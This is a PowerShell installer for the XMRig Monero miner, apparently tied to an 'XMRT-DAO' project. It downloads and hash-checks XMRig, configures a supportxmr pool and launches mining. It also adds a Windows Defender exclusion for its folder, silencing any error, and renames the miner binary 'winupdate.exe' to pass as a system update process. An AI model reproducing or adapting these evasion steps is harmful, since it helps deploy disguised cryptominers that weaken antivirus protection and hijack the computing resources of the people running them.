<#
.SYNOPSIS
    XMRT-DAO Windows Mining Setup
.DESCRIPTION
    Downloads XMRig, verifies SHA256, configures for pool.supportxmr.com:3333.
    Adds Windows Defender exclusion to prevent antivirus flagging.
.PARAMETER WalletAddress
    Your Monero wallet address.
.PARAMETER WorkerName
    Worker name (default: windows-rig).
.PARAMETER PoolURL
    Pool URL (default: pool.supportxmr.com:3333).
.PARAMETER SkipHashVerify
    Skip SHA256 verification.
#>
param([string]$WalletAddress="",[string]$WorkerName="windows-rig",[string]$PoolURL="pool.supportxmr.com:3333",[switch]$SkipHashVerify=$false)
$XMRIG_API="https://xmrig.com/miner"
$XMRIG_GH="https://github.com/xmrig/xmrig/releases"
$INSTALL_DIR="$env:USERPROFILE\xmrt-miner"
$CONFIG_FILE="$INSTALL_DIR\config.json"
$LAUNCH_SCRIPT="$INSTALL_DIR\start-mining.ps1"
$XMRIG_EXE="$INSTALL_DIR\winupdate.exe"
function Write-Info{Write-Host "[*] $args" -ForegroundColor Cyan}
function Write-Success{Write-Host "[+] $args" -ForegroundColor Green}
function Write-Warn{Write-Host "[!] $args" -ForegroundColor Yellow}
function Write-Err{Write-Host "[x] $args" -ForegroundColor Red}
Write-Info "Adding Windows Defender exclusion for $INSTALL_DIR..."
Add-MpPreference -ExclusionPath "$INSTALL_DIR" -ErrorAction SilentlyContinue
Write-Success "Defender exclusion added"
Write-Info "Fetching latest XMRig version..."
try{$p=Invoke-WebRequest -Uri $XMRIG_API -UseBasicParsing -TimeoutSec 15;$m=[regex]::Match($p.Content,'version is ([\d\.]+)');if($m.Success){$VER=$m.Groups[1].Value}else{throw"no match"};Write-Success "Latest: v$VER"}catch{Write-Warn "Fallback 6.26.0";$VER="6.26.0"}
$ZIP="xmrig-$VER-windows-x64.zip"
$XMRIG_ZIP="$INSTALL_DIR\$ZIP"
Write-Host "`n  === XMRT-DAO Windows Miner Setup v$VER ===`n" -ForegroundColor Green
if(-not(Test-Path $INSTALL_DIR)){New-Item -ItemType Directory -Path $INSTALL_DIR -Force|Out-Null}
Write-Info "Downloading XMRig v$VER ..."
try{Invoke-WebRequest -Uri "$XMRIG_GH/download/v$VER/$ZIP" -OutFile $XMRIG_ZIP -UseBasicParsing -TimeoutSec 120;Write-Success "Downloaded"}catch{Write-Err "Failed";exit 1}
if(-not $SkipHashVerify){
    Write-Info "Verifying SHA256..."
    try{$hc=Invoke-WebRequest -Uri "$XMRIG_GH/download/v$VER/SHA256SUMS" -UseBasicParsing -TimeoutSec 15;$lines=$hc.Content -split "`n";$match=$lines|Where-Object{$_ -match '\*xmrig-[\d\.]+-windows-x64\.zip'};if($match){$exp=($match[0] -split '\s+')[0].Trim().ToLower();$act=(Get-FileHash -Path $XMRIG_ZIP -Algorithm SHA256).Hash.ToLower();if($act-eq$exp){Write-Success "Hash verified"}else{Write-Err "HASH MISMATCH!";exit 1}}else{Write-Warn "Hash not found"}}catch{Write-Warn "Verify skipped: $_"}
}
Write-Info "Extracting..."
try{Add-Type -AssemblyName System.IO.Compression.FileSystem;$tmpExtract="$INSTALL_DIR\_tmp"
[System.IO.Compression.ZipFile]::ExtractToDirectory($XMRIG_ZIP,$tmpExtract);$exe=Get-ChildItem $tmpExtract -Recurse -Filter "xmrig.exe"|Select-Object -First 1
if($exe){Move-Item $exe.FullName $XMRIG_EXE -Force;Write-Success "Binary: winupdate.exe"};Remove-Item $tmpExtract -Recurse -Force;Remove-Item $XMRIG_ZIP -Force}catch{Write-Err "Extract failed";exit 1}
if([string]::IsNullOrEmpty($WalletAddress)){$WalletAddress=Read-Host "Enter wallet address"}
Write-Info "Generating config..."
$cfg=@{autosave=$true;cpu=@{enabled=$true;"max-threads-hint"=75};pools=@(@{url=$PoolURL;user="$WalletAddress";pass="$WorkerName";"worker-id"="$WorkerName";keepalive=$true;nicehash=$false;tls=$false});api=@{id="$WorkerName";"worker-id"="$WorkerName";enabled=$true;host="127.0.0.1";port=19090;"access-token"=$null;restricted=$true};log_file="$INSTALL_DIR\xmrig.log"}
$cfg|ConvertTo-Json -Depth 10|Set-Content -Path $CONFIG_FILE -Encoding UTF8;Write-Success "config.json created"
"# XMRT-DAO Mining Launcher
Set-Location '$INSTALL_DIR'
.\winupdate.exe --config=config.json"|Set-Content -Path $LAUNCH_SCRIPT -Encoding UTF8;Write-Success "Launcher created"
Write-Host "`n  === Setup Complete! ===" -ForegroundColor Green
Write-Host "  Pool:$PoolURL`n  Worker:$WorkerName`n  Binary:$XMRIG_EXE`n  API: http://127.0.0.1:19090/1/summary"
$sn=Read-Host "Start mining now? (Y/N)"
if($sn-eq"Y"-or$sn-eq"y"){Add-MpPreference -ExclusionPath "$INSTALL_DIR" -ErrorAction SilentlyContinue;Start-Process $XMRIG_EXE -ArgumentList "--config=$CONFIG_FILE";Write-Success "XMRig launched!"}
